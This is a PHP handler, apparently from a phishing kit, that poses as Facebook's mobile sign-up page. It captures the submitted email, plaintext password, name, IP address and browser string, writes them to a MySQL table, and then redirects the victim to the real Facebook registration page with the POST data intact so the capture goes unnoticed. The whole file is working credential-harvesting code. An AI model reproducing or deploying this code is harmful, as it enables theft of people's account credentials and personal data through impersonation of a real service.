<?php
require_once("../../config.php");
///cadastro mobile real = https://mobile.facebook.com/reg/?cid=103&locale2=pt_BR

	 if (isset($_POST["reg_email__"],$_POST["reg_passwd__"])){
		if((!empty($_POST["reg_email__"])) && (!empty($_POST["reg_passwd__"]))){
			
		
	$dados = array(
		"email"=>$_POST["reg_email__"],
		"senha"=>$_POST["reg_passwd__"],
		"nome"=>$_POST["firstname"],
		"sobrenome"=>$_POST["lastname"],
		"ip"=>$_SERVER["REMOTE_ADDR"],
		"browser"=>$_SERVER['HTTP_USER_AGENT']
	);

			/*Inclui dados no banco*/

			$conexao = new PDO("mysql:host=".$host.";dbname=".$db,$user,$pass);
		if ($conexao){
			$add = $conexao->prepare("INSERT INTO usuarios(email,senha,nome,ip,HoraData,UserAgent)
			VALUES(:email,:senha,:nome,:ip,:HoraData,:UserAgent)");			
			
			$add->bindValue(":email",$dados["email"],PDO::PARAM_STR);
			$add->bindValue(":senha",$dados["senha"],PDO::PARAM_STR);
			$add->bindValue(":nome",$dados["nome"]." ".$dados["sobrenome"],PDO::PARAM_STR);
			$add->bindValue(":ip",$dados["ip"],PDO::PARAM_STR);	
			$add->bindValue(":HoraData",date("Y-m-d H:i:s"),PDO::PARAM_STR);
			$add->bindValue(":UserAgent",$dados["browser"],PDO::PARAM_STR);

				if($add->execute()){
					/* Redireciona para cadastro verdadeiro mantendo post;produto final */
			header("Location: https://mobile.facebook.com/reg/?cid=103&locale2=pt_BR",TRUE,307); 
			
				}else{include("index.html");}
		}

		




	}else{include("index.html");}

	}//isset


?>
